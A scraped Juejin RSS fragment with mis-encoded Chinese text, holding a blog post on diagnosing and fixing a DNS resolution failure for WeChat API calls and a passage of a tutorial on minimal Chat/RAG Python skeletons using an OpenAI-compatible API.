.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">é—®é¢˜èƒŒæ™¯</h2>
<p>æŸå¤©ï¼Œçº¿ä¸Šç¯å¢ƒçªç„¶å‡ºç°å¤§é‡å¾®ä¿¡å°ç¨‹åºç™»å½•å¤±è´¥çš„é—®é¢˜ï¼Œç”¨æˆ·åé¦ˆæ— æ³•æ­£å¸¸ç™»å½•ã€‚æŸ¥çœ‹æ—¥å¿—å‘ç°å¤§é‡ <code>UnknownHostException: api.weixin.qq.com</code>å¼‚å¸¸ï¼Œä½†å¥‡æ€ªçš„æ˜¯ï¼Œå…¶ä»–ä¸šåŠ¡æ¥å£éƒ½èƒ½æ­£å¸¸è®¿é—®ã€‚</p>
<h2 data-id="heading-1">é”™è¯¯ä¿¡æ¯</h2>
<pre><code class="hljs language-vbscript" lang="vbscript">org.springframework.web.client.ResourceAccessException: I/O <span class="hljs-keyword">error</span> <span class="hljs-keyword">on</span> <span class="hljs-keyword">GET</span> <span class="hljs-built_in">request</span> <span class="hljs-keyword">for</span> <span class="hljs-string">"https://api.weixin.qq.com/sns/jscode2session"</span>: api.weixin.qq.com; nested exception <span class="hljs-keyword">is</span> java.net.UnknownHostException: api.weixin.qq.com
</code></pre>
<h2 data-id="heading-2">æ’æŸ¥è¿‡ç¨‹</h2>
<h3 data-id="heading-3">ç¬¬ä¸€æ­¥ï¼šåŸºç¡€ç½‘ç»œè¿é€šæ€§æµ‹è¯•</h3>
<p>é¦–å…ˆåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡ŒåŸºç¡€ç½‘ç»œæµ‹è¯•ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æµ‹è¯•åŸŸåè§£æ</span>
ping api.weixin.qq.com
<span class="hljs-comment"># è¾“å‡ºï¼šunknown host</span>

<span class="hljs-comment"># ä½¿ç”¨digå·¥å…·æµ‹è¯•DNSè§£æ</span>
dig api.weixin.qq.com
<span class="hljs-comment"># è¾“å‡ºï¼šconnection timed out; no servers could be reached</span>
</code></pre>
<p><code>dig</code>å‘½ä»¤çš„ <code>connection timed out</code>æç¤ºéå¸¸å…³é”®ï¼Œè¯´æ˜æœåŠ¡å™¨æ— æ³•è¿æ¥åˆ°é…ç½®çš„DNSæœåŠ¡å™¨ã€‚</p>
<h3 data-id="heading-4">ç¬¬äºŒæ­¥ï¼šæ£€æŸ¥DNSé…ç½®</h3>
<p>æŸ¥çœ‹å½“å‰DNSé…ç½®ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cat</span> /etc/resolv.conf
</code></pre>
<p>è¾“å‡ºç»“æœï¼š</p>
<pre><code class="hljs">nameserver 183.60.83.19
nameserver 183.60.82.98
</code></pre>
<h3 data-id="heading-5">ç¬¬ä¸‰æ­¥ï¼šéªŒè¯DNSæœåŠ¡å™¨å¯è¾¾æ€§</h3>
<p>æµ‹è¯•é…ç½®çš„DNSæœåŠ¡å™¨æ˜¯å¦å¯è¾¾ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">ping 183.60.83.19
<span class="hljs-comment"># è¾“å‡ºï¼šDestination Host Unreachable</span>

ping 183.60.82.98
<span class="hljs-comment"># è¾“å‡ºï¼šDestination Host Unreachable</span>
</code></pre>
<p>ç¡®è®¤é—®é¢˜ï¼šâ€‹<strong>é…ç½®çš„DNSæœåŠ¡å™¨ä¸å¯è¾¾</strong>ã€‚</p>
<h3 data-id="heading-6">ç¬¬å››æ­¥ï¼šä½¿ç”¨å…¬å…±DNSæµ‹è¯•</h3>
<p>ä¸ºäº†ç¡®è®¤ä¸æ˜¯å¾®ä¿¡APIçš„é—®é¢˜ï¼Œä½¿ç”¨Googleçš„å…¬å…±DNSè¿›è¡Œæµ‹è¯•ï¼š</p>
<pre><code class="hljs language-css" lang="css">dig <span class="hljs-keyword">@8</span>.8.8.8 api.weixin.qq.com
</code></pre>
<p>è¾“å‡ºç»“æœæ­£å¸¸ï¼Œèƒ½å¤Ÿæ­£ç¡®è§£æåˆ°å¾®ä¿¡APIçš„IPåœ°å€ï¼Œè¯´æ˜å¾®ä¿¡APIæœ¬èº«æ²¡æœ‰é—®é¢˜ã€‚</p>
<h2 data-id="heading-7">è§£å†³æ–¹æ¡ˆ</h2>
<h3 data-id="heading-8">ä¿®æ”¹DNSé…ç½®</h3>
<p>ç¼–è¾‘ <code>/etc/resolv.conf</code>æ–‡ä»¶ï¼Œå°†ä¸å¯è¾¾çš„DNSæœåŠ¡å™¨æ›¿æ¢ä¸ºå¯é çš„å…¬å…±DNSï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¤‡ä»½åŸé…ç½®</span>
<span class="hljs-built_in">cp</span> /etc/resolv.conf /etc/resolv.conf.bak

<span class="hljs-comment"># ç¼–è¾‘é…ç½®æ–‡ä»¶</span>
vi /etc/resolv.conf
</code></pre>
<p>ä¿®æ”¹å†…å®¹ä¸ºï¼š</p>
<pre><code class="hljs">nameserver 114.114.114.114
nameserver 8.8.8.8
nameserver 223.5.5.5
</code></pre>
<h3 data-id="heading-9">éªŒè¯ä¿®å¤æ•ˆæœ</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æµ‹è¯•åŸŸåè§£æ</span>
dig api.weixin.qq.com
<span class="hljs-comment"># è¾“å‡ºï¼šæ­£å¸¸è¿”å›IPåœ°å€</span>

<span class="hljs-comment"># æµ‹è¯•ç½‘ç»œè¿é€šæ€§</span>
ping api.weixin.qq.com
<span class="hljs-comment"># è¾“å‡ºï¼šæ­£å¸¸å“åº”</span>
</code></pre>
<p>é‡å¯åº”ç”¨åï¼Œå¾®ä¿¡å°ç¨‹åºç™»å½•åŠŸèƒ½æ¢å¤æ­£å¸¸ã€‚</p>
<h2 data-id="heading-10">é—®é¢˜æ€»ç»“</h2>
<p>é—®é¢˜ç±»å‹</p>
<p>å…·ä½“è¡¨ç°</p>
<p>æ ¹æœ¬åŸå› </p>
<p>è§£å†³æ–¹æ¡ˆ</p>
<p>DNSè§£æå¤±è´¥</p>
<p>UnknownHostException</p>
<p>é…ç½®çš„DNSæœåŠ¡å™¨ä¸å¯è¾¾</p>
<p>æ›´æ¢ä¸ºå…¬å…±DNSæœåŠ¡å™¨</p>
<p>ç½‘ç»œè¿é€šæ€§</p>
<p>åŸŸåæ— æ³•è§£æ</p>
<p>è¿è¥å•†DNSæœåŠ¡å™¨æ•…éšœ</p>
<p>ä½¿ç”¨114.114.114.114ç­‰å¤‡ç”¨DNS</p>
<h2 data-id="heading-11">ç»éªŒæ•™è®­</h2>
<ol>
<li>
<p>â€‹<strong>ä¸è¦å®Œå…¨ä¾èµ–è¿è¥å•†DNS</strong>â€‹ï¼šè¿è¥å•†DNSæœåŠ¡å™¨å¶å°”ä¼šå‡ºç°æ•…éšœï¼Œå»ºè®®é…ç½®å¤šä¸ªå¤‡ç”¨DNSæœåŠ¡å™¨</p>
</li>
<li>
<p>â€‹<strong>DNSé…ç½®è¦å®šæœŸæ£€æŸ¥</strong>â€‹ï¼šå®šæœŸéªŒè¯DNSæœåŠ¡å™¨çš„å¯ç”¨æ€§ï¼Œé¿å…å•ç‚¹æ•…éšœ</p>
</li>
<li>
<p>â€‹<strong>åº”ç”¨å±‚å¢åŠ å®¹é”™æœºåˆ¶</strong>â€‹ï¼šåœ¨ä»£ç ä¸­æ•è· <code>UnknownHostException</code>å¼‚å¸¸ï¼Œæä¾›å‹å¥½çš„é”™è¯¯æç¤ºå’Œé‡è¯•æœºåˆ¶</p>
</li>
<li>
<p>â€‹<strong>ç›‘æ§å‘Šè­¦è¦å®Œå–„</strong>â€‹ï¼šå¯¹DNSè§£æå¤±è´¥ã€ç½‘ç»œè¿é€šæ€§å¼‚å¸¸ç­‰å…³é”®æŒ‡æ ‡è®¾ç½®ç›‘æ§å‘Šè­¦</p>
</li>
</ol>
<h2 data-id="heading-12">ä»£ç å±‚é¢çš„ä¼˜åŒ–å»ºè®®</h2>
<p>åœ¨Spring Bootåº”ç”¨ä¸­ï¼Œå¯ä»¥åœ¨è°ƒç”¨å¾®ä¿¡APIçš„åœ°æ–¹å¢åŠ å¼‚å¸¸å¤„ç†å’Œé‡è¯•æœºåˆ¶ï¼š</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@Retryable</span>(value = {ResourceAccessException.class}, maxAttempts = <span class="hljs-number">3</span>, backoff = <span class="hljs-variable">@Backoff</span>(delay = <span class="hljs-number">1000</span>))
public WxSessionInfo <span class="hljs-built_in">getWxSession</span>(String code) {
    <span class="hljs-selector-tag">try</span> {
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">restTemplate</span><span class="hljs-selector-class">.getForObject</span>(url, WxSessionInfo.class);
    } <span class="hljs-selector-tag">catch</span> (ResourceAccessException e) {
        <span class="hljs-selector-tag">log</span><span class="hljs-selector-class">.error</span>(<span class="hljs-string">"å¾®ä¿¡APIè°ƒç”¨å¤±è´¥ï¼ŒåŸŸåè§£æå¼‚å¸¸"</span>, e);
        <span class="hljs-selector-tag">throw</span> <span class="hljs-selector-tag">e</span>;
    }
}
</code></pre>
<p>é€šè¿‡è¿™æ¬¡æ’æŸ¥ï¼Œæˆ‘ä»¬ä¸ä»…è§£å†³äº†é—®é¢˜ï¼Œè¿˜å®Œå–„äº†ç³»ç»Ÿçš„å®¹é”™èƒ½åŠ›å’Œç›‘æ§ä½“ç³»ï¼Œä¸ºåç»­çš„ç¨³å®šæ€§ä¿éšœæ‰“ä¸‹äº†åšå®åŸºç¡€ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Chat / RAG / Agent æœ€å°å®ç°æ¨¡æ¿ï¼šä¸€å¼ é€‰å‹è¡¨ + ä¸‰æ®µ Python éª¨æ¶]]></title>    <link>https://juejin.cn/post/7589074117643698211</link>    <guid>https://juejin.cn/post/7589074117643698211</guid>    <pubDate>2025-12-29T08:07:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589074117643698211" data-draft-id="7588971908226990114" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Chat / RAG / Agent æœ€å°å®ç°æ¨¡æ¿ï¼šä¸€å¼ é€‰å‹è¡¨ + ä¸‰æ®µ Python éª¨æ¶"/> <meta itemprop="keywords" content="AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2025-12-29T08:07:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="147AI"/> <meta itemprop="url" content="https://juejin.cn/user/872345976974154"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Chat / RAG / Agent æœ€å°å®ç°æ¨¡æ¿ï¼šä¸€å¼ é€‰å‹è¡¨ + ä¸‰æ®µ Python éª¨æ¶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/872345976974154/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    147AI
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T08:07:26.000Z" title="Mon Dec 29 2025 08:07:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¦‚æœä½ æƒ³åšå¤§æ¨¡å‹è½åœ°ï¼Œæœ€å®¹æ˜“èµ°åçš„åœ°æ–¹ä¸æ˜¯â€œæ¨¡å‹é€‰é”™â€ï¼Œè€Œæ˜¯<strong>å½¢æ€é€‰é”™</strong>ï¼š<br/>
Chat èƒ½æå®šçš„äº‹æƒ…ä½ ä¸Š Agentï¼ŒRAG è¯¥ä¸Šçš„åœ°æ–¹ä½ ç”¨ Prompt ç¡¬ç¼–ï¼Œæœ€åå°±æ˜¯ç»´æŠ¤æˆæœ¬çˆ†ç‚¸ + æ•ˆæœè¿˜ä¸ç¨³ã€‚</p>
<p>è¿™ç¯‡åªç»™ä½ ä¸¤æ ·ä¸œè¥¿ï¼š</p>
<ol>
<li>ä¸€å¼ <strong>é€‰å‹è¡¨</strong>ï¼ˆç…§ç€é€‰ä¸å®¹æ˜“ç¿»è½¦ï¼‰</li>
<li>ä¸‰æ®µ<strong>æœ€å° Python éª¨æ¶</strong>ï¼ˆç›´æ¥å¼€å·¥ï¼‰</li>
</ol>
<hr/>
<h2 data-id="heading-0">1ï¼‰é€‰å‹è¡¨ï¼ˆå…ˆåˆ¤æ–­â€œè¯æ®â€å’Œâ€œåŠ¨ä½œâ€ï¼‰</h2>

































<table><thead><tr><th>å½¢æ€</th><th>ä½ è¦è§£å†³ä»€ä¹ˆ</th><th>ä»€ä¹ˆæ—¶å€™ç”¨</th><th>ä½ éœ€è¦å‡†å¤‡ä»€ä¹ˆ</th><th>ä¸Šçº¿å¤æ‚åº¦</th></tr></thead><tbody><tr><td>Chat</td><td>ç”Ÿæˆ/æ€»ç»“/è§£é‡Š/é—®ç­”</td><td>ä¸éœ€è¦å¼•ç”¨å†…éƒ¨èµ„æ–™ã€ä¸éœ€è¦æ‰§è¡ŒåŠ¨ä½œ</td><td>å‡ ä¹æ— </td><td>ä½</td></tr><tr><td>RAG</td><td>åŸºäºèµ„æ–™å›ç­” + å¯è¿½æº¯</td><td>å¿…é¡»åŸºäºæ–‡æ¡£/çŸ¥è¯†åº“å›ç­”ï¼Œä¸”å¸Œæœ›å¯å¼•ç”¨æ¥æº</td><td>æ–‡æ¡£æ²»ç† + æ£€ç´¢é“¾è·¯</td><td>ä¸­</td></tr><tr><td>Agent</td><td>è§„åˆ’ + å¤šæ­¥æ‰§è¡Œ</td><td>éœ€è¦è°ƒç”¨å·¥å…·/æ¥å£è·‘æµç¨‹ã€è‡ªåŠ¨åŒ–ä»»åŠ¡</td><td>å·¥å…·æ¥å£ + æƒé™ + æ—¥å¿— + å›é€€</td><td>é«˜</td></tr></tbody></table>
<p>ä¸€å¥è¯åˆ¤æ–­ï¼š</p>
<ul>
<li><strong>è¦è¯æ®</strong> â†’ RAG</li>
<li><strong>è¦åŠ¨ä½œ</strong> â†’ Agent</li>
<li>éƒ½ä¸è¦ â†’ Chat</li>
</ul>
<hr/>
<h2 data-id="heading-1">2ï¼‰ç»Ÿä¸€ä¸€ä¸ªâ€œæ¥å…¥å±‚â€ï¼ˆå¯è¿ç§»å†™æ³•ï¼‰</h2>
<p>å¾ˆå¤šå›¢é˜Ÿåé¢éƒ½ä¼šåšï¼šå¤šæ¨¡å‹å¯¹æ¯”ã€è·¯ç”±ã€è¯„æµ‹ã€‚<br/>
å› æ­¤æˆ‘å»ºè®®æŠŠ LLM è°ƒç”¨å°è£…æˆä¸€ä¸ªâ€œæ¥å…¥å±‚â€ï¼Œç”¨ OpenAI å…¼å®¹åè®®ä¼šçœäº‹ï¼ˆå¤šæ•°æƒ…å†µä¸‹åªæ”¹ <code>base_url</code>/<code>api_key</code>ï¼‰ã€‚</p>
<p>ä»¥ OpenAI å…¼å®¹æœåŠ¡147ai ä¸ºä¾‹ï¼ˆå‚æ•°ä»¥æ–‡æ¡£ä¸æ§åˆ¶å°ä¸ºå‡†ï¼‰ï¼š</p>
<ul>
<li>Base URLï¼š<code>https://147ai.com/v1</code></li>
<li>ç«¯ç‚¹ï¼š<code>POST /chat/completions</code></li>
<li>é‰´æƒï¼š<code>Authorization: Bearer &lt;KEY&gt;</code></li>
</ul>
<h3 data-id="heading-2">2.1 æˆ‘å»ºè®®ä½ æŒ‰â€œå·¥ç¨‹æ–‡ä»¶â€æ‹†å¼€ï¼ˆåç»­æ‰©å±•ä¼šå¾ˆé¡ºï¼‰</h3>
<p>ä¸€ä¸ªå¾ˆå¸¸è§çš„ç¿»è½¦ç‚¹æ˜¯ï¼šä¸€å¼€å§‹æŠŠæ‰€æœ‰é€»è¾‘å¡åœ¨ä¸€ä¸ªè„šæœ¬é‡Œï¼Œç­‰åˆ°è¦åŠ  RAG/è¯„æµ‹/è·¯ç”±æ—¶ï¼Œæ²¡äººæ•¢æ”¹ã€‚</p>
<p>ä½ å¯ä»¥ç”¨è¿™ä¸ªæœ€å°ç›®å½•ç»“æ„å¼€å±€ï¼š</p>
<pre><code class="hljs language-text" lang="text">app/
  llm_client.py      # ç»Ÿä¸€å…¥å£ï¼šchat()ã€è¶…æ—¶ã€é‡è¯•ã€æ—¥å¿—
  prompts.py         # ç³»ç»Ÿæç¤ºè¯/æ¨¡æ¿é›†ä¸­ç®¡ç†
  rag.py             # retrieve()ã€build_context()ã€rag_answer()
  agent.py           # å·¥å…·æ³¨å†Œã€åœæ­¢æ¡ä»¶ã€run_agent()
  eval.py            # æœ€å°è¯„æµ‹ï¼šæ ·ä¾‹é›†+æŒ‡æ ‡
</code></pre>
<hr/>
<h2 data-id="heading-3">3ï¼‰Chatï¼šæœ€å°å¯ç”¨ï¼ˆå¯ç›´æ¥è·‘ï¼‰</h2>
<pre><code class="hljs language-bash" lang="bash">pip install -U openai
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> openai <span class="hljs-keyword">import</span> OpenAI

client = OpenAI(
    api_key=<span class="hljs-string">"YOUR_147AI_API_KEY"</span>,
    base_url=<span class="hljs-string">"https://147ai.com/v1"</span>,
)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">chat</span>(<span class="hljs-params">prompt: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    resp = client.chat.completions.create(
        model=<span class="hljs-string">"gpt-4.1-mini"</span>,  <span class="hljs-comment"># æ¢æˆæ§åˆ¶å°æ”¯æŒçš„æ¨¡å‹å…¨å</span>
        messages=[{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: prompt}],
    )
    <span class="hljs-keyword">return</span> resp.choices[<span class="hljs-number">0</span>].message.content

<span class="hljs-built_in">print</span>(chat(<span class="hljs-string">"æŠŠä¸‹é¢è¿™æ®µéœ€æ±‚æ‹†æˆä»»åŠ¡æ¸…å•ï¼Œå¹¶ç»™éªŒæ”¶æ ‡å‡†ï¼š..."</span>))
</code></pre>
<h3 data-id="heading-4">3.1 æŠŠâ€œé‡è¯•/æ—¥å¿—â€å…ˆå†™è¿›æ¥å…¥å±‚ï¼ˆä¸Šçº¿å‰æœ€çœä½ å‘½ï¼‰</h3>
<p>å“ªæ€•ä½ ç°åœ¨åªæ˜¯ PoCï¼Œä¹Ÿå»ºè®®æŠŠè¿™ä¸¤ä»¶äº‹åœ¨æ¥å…¥å±‚å°±å†™å¥½ï¼š</p>
<ul>
<li><strong>é‡è¯•</strong>ï¼šåº”å¯¹å¶å‘ç½‘ç»œ/ç½‘å…³æŠ–åŠ¨</li>
<li><strong>æ—¥å¿—</strong>ï¼šå®šä½â€œä¸ºä»€ä¹ˆè¿™æ¬¡ä¸è¡Œâ€</li>
</ul>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¸å¼•å…¥ç¬¬ä¸‰æ–¹ä¾èµ–çš„â€œæœ€å°é‡è¯•â€ç¤ºä¾‹ï¼ˆä½ å¯ä»¥ç§»åˆ° <code>llm_client.py</code>ï¼‰ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> time
<span class="hljs-keyword">from</span> openai <span class="hljs-keyword">import</span> OpenAI

client = OpenAI(api_key=<span class="hljs-string">"YOUR_147AI_API_KEY"</span>, base_url=<span class="hljs-string">"https://147ai.com/v1"</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">chat_with_retry</span>(<span class="hljs-params">prompt: <span class="hljs-built_in">str</span>, retries: <span class="hljs-built_in">int</span> = <span class="hljs-number">2</span>, backoff: <span class="hljs-built_in">float</span> = <span class="hljs-number">0.8</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    last_err = <span class="hljs-literal">None</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(retries + <span class="hljs-number">1</span>):
        <span class="hljs-keyword">try</span>:
            resp = client.chat.completions.create(
                model=<span class="hljs-string">"gpt-4.1-mini"</span>,
                messages=[{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: prompt}],
            )
            <span class="hljs-keyword">return</span> resp.choices[<span class="hljs-number">0</span>].message.content
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            last_err = e
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[retry] attempt=<span class="hljs-subst">{i+<span class="hljs-number">1</span>}</span> err=<span class="hljs-subst">{e}</span>"</span>)
            time.sleep(backoff * (<span class="hljs-number">2</span> ** i))
    <span class="hljs-keyword">raise</span> last_err
</code></pre>
<hr/>
<h2 data-id="heading-5">4ï¼‰RAGï¼šæœ€å°é“¾è·¯ï¼ˆèƒ½è·‘é€šå°±è¡Œï¼Œå…ˆåˆ«è¿½æ±‚å®Œç¾ï¼‰</h2>
<p>RAG çš„æœ¬è´¨ï¼š<strong>æ£€ç´¢ï¼ˆæ‰¾è¯æ®ï¼‰ + ç”Ÿæˆï¼ˆå†™ç­”æ¡ˆï¼‰</strong>ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">retrieve</span>(<span class="hljs-params">query: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">list</span>[<span class="hljs-built_in">str</span>]:
    <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> å‘é‡åŒ– -&gt; top-k æ£€ç´¢ -&gt;ï¼ˆå¯é€‰ï¼‰é‡æ’</span>
    <span class="hljs-keyword">return</span> [<span class="hljs-string">"chunk1"</span>, <span class="hljs-string">"chunk2"</span>]

<span class="hljs-keyword">def</span> <span class="hljs-title function_">rag</span>(<span class="hljs-params">query: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    context = <span class="hljs-string">"\n\n"</span>.join(retrieve(query))
    prompt = <span class="hljs-string">f"""ä½ æ˜¯ä¼ä¸šçŸ¥è¯†åŠ©æ‰‹ã€‚
è¯·åªåŸºäº&lt;èµ„æ–™&gt;å›ç­”ï¼›å¦‚æœèµ„æ–™ä¸è¶³ï¼Œè¯·å›ç­”â€œèµ„æ–™ä¸è¶³â€ã€‚
&lt;èµ„æ–™&gt;
<span class="hljs-subst">{context}</span>
&lt;/èµ„æ–™&gt;
é—®é¢˜ï¼š<span class="hljs-subst">{query}</span>
"""</span>
    <span class="hljs-keyword">return</span> chat(prompt)

<span class="hljs-built_in">print</span>(rag(<span class="hljs-string">"æˆ‘ä»¬çš„é€€æ¬¾è§„åˆ™æ˜¯ä»€ä¹ˆï¼Ÿéœ€è¦å¼•ç”¨åŸæ–‡ã€‚"</span>))
</code></pre>
<blockquote>
<p>RAG æœ€å¸¸è§ç¿»è½¦ç‚¹ï¼šchunk åˆ‡å¾—ä¸å¯¹ã€æ£€ç´¢ä¸åˆ°ã€æ£€ç´¢åˆ°é”™çš„ã€æ‹¼æ¥å¤ªé•¿æ±¡æŸ“æç¤ºè¯ã€‚<br/>
å»ºè®®ä¸‹ä¸€æ­¥åšï¼šè¯„æµ‹é›†ï¼ˆ30â€“100æ¡ï¼‰+ æ£€ç´¢è´¨é‡æŒ‡æ ‡ã€‚</p>
</blockquote>
